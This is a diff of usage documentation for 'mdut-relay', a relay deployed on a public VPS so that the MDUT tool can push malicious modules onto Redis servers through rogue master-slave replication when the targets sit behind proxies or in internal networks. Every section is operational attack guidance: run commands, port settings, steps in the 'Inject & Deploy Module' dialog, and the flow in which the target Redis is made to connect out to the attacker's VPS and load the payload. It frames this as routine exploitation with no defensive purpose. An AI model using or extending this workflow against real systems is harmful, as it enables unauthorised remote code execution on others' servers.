@@ -2,62 +2,66 @@
 
 ## Background
 
-When exploiting Redis through master-slave replication to load malicious modules, the target Redis server needs to actively connect back to the "master node". If the target is in an internal network or accessed through a SOCKS5 proxy, it cannot directly connect back to your local listener, causing the exploitation to fail.
+When exploiting Redis through master-slave replication (`SLAVEOF`) to load malicious modules, the target Redis must actively connect to our Rogue Server to sync the payload. However, in the following scenarios, MDUT's local listener is unreachable from the target:
 
-**mdut-relay** is a lightweight TCP bidirectional forwarding tool deployed on a public VPS to solve this connectivity issue.
+1. **Deep intranet**: MDUT and the target are on different subnets; the target can only reach specific public IPs
+2. **SOCKS5 proxy**: MDUT accesses the target via a forward proxy; the local IP is invisible to the target network
 
-## Architecture
+**mdut-relay** is a lightweight transparent TCP traffic bridger deployed on a public VPS that bridges the MDUT control stream and the target Redis stream for seamless module delivery.
+
+## How It Works
 
 ```
-[MDUT Local] <──── Port 21000 ────> [VPS: mdut-relay] <──── Port 21001 ────> [Target Redis]
+[MDUT Local] ──connect──> [VPS:21000 (control)]
+                              │ mdut-relay bidirectional forwarding
+[Target Redis] ──connect──> [VPS:21001 (target)]
 ```
 
-- Port **21000**: MDUT client connects to relay (control port)
-- Port **21001**: Target Redis connects back to relay (target port)
+1. `mdut-relay` listens on two ports: control port (default `21000`) and target port (default `21001`)
+2. MDUT connects to port `21000` when initiating deployment
+3. MDUT instructs the target Redis to execute `SLAVEOF vps_ip 21001`
+4. Target Redis connects to port `21001`
+5. `mdut-relay` pairs both connections and starts full-duplex transparent forwarding; disconnects after payload delivery
 
-## Prerequisites
+> Built-in 15-second timeout reset: if the target fails to connect, the relay automatically resets to prevent queue deadlocks.
 
-1. A VPS with a public IP address
-2. Open firewall ports `21000` and `21001` (TCP)
-3. Download the binary for your platform from [mdut-relay releases](https://github.com/Ch1ngg/mdut-relay/releases)
+## Usage
 
-## Deployment Steps
+### Step 1: Run on VPS
 
-### Step 1: Start the relay on VPS
+Download the binary for your architecture from [mdut-relay releases](https://github.com/Ch1ngg/mdut-relay/releases), make it executable, and run:
 
 ```bash
-# Use default ports (21000 for control, 21001 for target)
-./mdut-relay
-
-# Custom ports
-./mdut-relay -cp 21000 -tp 21001
+chmod +x mdut-relay-linux-amd64
+./mdut-relay-linux-amd64 -c 21000 -r 21001
 ```
 
 Parameters:
 
 | Flag | Description | Default |
 |------|-------------|---------|
-| `-cp` | MDUT client connection port (Control Port) | `21000` |
-| `-tp` | Target Redis connection port (Target Port) | `21001` |
+| `-c` | Control port (MDUT client connects here) | `21000` |
+| `-r` | Target port (target Redis connects here) | `21001` |
 
-Once started, the relay will listen continuously. When both sides connect, it automatically establishes a bidirectional forwarding channel. Idle connections are automatically disconnected after 15 seconds to prevent blocking.
+🚨 **Important**: Ensure your VPS firewall/security group allows **inbound TCP on both 21000 and 21001**!
 
-### Step 2: Configure relay in MDUT
+### Step 2: Configure in MDUT
 
-In MDUT's Redis exploitation panel, set the master-slave replication (Rogue Server) mode to relay mode and fill in:
+In MDUT's Redis "Inject & Deploy Module" dialog:
 
-- **Relay Address**: VPS public IP
-- **Control Port**: `21000` (matches `-cp`)
-- **Target Connection Port**: `21001` (matches `-tp`)
+1. Select **"VPS Relay (ServeRelay)"** mode
+2. **VPS Relay control address**: enter `VPS_IP:21000`
+3. **VPS target connection IP**: enter `VPS_IP`
+4. Click inject
 
-### Step 3: Execute exploitation
+### Step 3: Done
 
-After configuration, click "Deploy Module". MDUT will:
-
-1. Instruct target Redis to connect to `VPS:21001` as a slave node
-2. MDUT local client simultaneously connects to `VPS:21000`
-3. Relay establishes transparent forwarding channel when both sides connect
-4. Module files are transmitted through the channel to the target and loaded
+MDUT automatically:
+1. Connects to VPS control port (21000)
+2. Instructs target Redis to slaveof VPS target port (21001)
+3. Relay pairs both connections and forwards bidirectionally
+4. Module payload reaches target and loads
+5. Disconnects after completion
 
 ## Use Cases
 
@@ -65,14 +69,14 @@ After configuration, click "Deploy Module". MDUT will:
 |----------|----------------|
 | Direct access to target, local has public IP | ❌ No |
 | Target via SOCKS5 proxy, local has no public IP | ✅ Yes |
-| Target in internal network, local has no public IP | ✅ Yes |
-| Direct access to target, local has public IP but blocked by firewall | ✅ Yes |
+| Target in deep intranet, local unreachable | ✅ Yes |
+| Local has public IP but port blocked by firewall | ✅ Yes |
 
 ## Notes
 
-- The relay does not store any data, only performs transparent forwarding
+- The relay only performs transparent forwarding, no data is stored
 - Recommend restarting the relay after each exploitation to avoid residual connections
-- VPS ports 21000/21001 should be closed after exploitation is complete
+- Close VPS ports 21000/21001 after exploitation is complete
 
 ## Project Repository
 
